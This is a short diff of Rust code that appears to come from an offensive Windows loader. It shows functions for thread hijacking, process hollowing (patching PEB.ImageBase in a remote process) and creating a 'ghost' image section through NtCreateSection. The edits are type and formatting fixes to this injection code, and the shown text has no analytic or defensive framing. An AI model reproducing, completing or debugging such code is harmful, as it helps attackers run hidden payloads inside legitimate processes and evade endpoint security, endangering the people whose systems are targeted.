@@ -1,5 +1,5 @@
 use std::ffi::c_void;
-use std::mem::{zeroed};
+use std::mem::{zeroed, size_of};
 use std::ops::Add;
 use std::ptr::{null, null_mut};
 use ccommon_fn::essentials;
@@ -52,7 +52,7 @@ pub unsafe fn hijack_remote_process_execution(
     // Thread hijacking
     let new_addr = (remote_base_addr as usize).add(entry_point_rva as usize) as u64;
     context.Rcx = new_addr;
-    println!("[*] Entry point address: {}", context.Rcx);
+    println!("[*] Entry point address: {:p}", context.Rcx as *mut c_void);
 
     // Process hollowing - get the offset to the PEB.ImageBase as element [PPEB is at Context.Rdx]
     let offset = offset_of!(types::PEB, ImageBase);
@@ -73,7 +73,7 @@ pub unsafe fn hijack_remote_process_execution(
         p_remote_img_base,
         &mut p_remote_base_addr,
         size_of::<u64>(),
-        0usize
+        null_mut::<usize>()
     );
     if status != 0 {
         eprintln!("[!] Status: {}", status);
@@ -159,7 +159,7 @@ pub unsafe fn create_ghost_section(
             "NtCreateSection",
             &mut section_handle,
             SECTION_ALL_ACCESS,
-            null::<usize>(),
+            null_mut::<OBJECT_ATTRIBUTES>(),
             0x00,
             PAGE_READONLY,
             SEC_IMAGE,
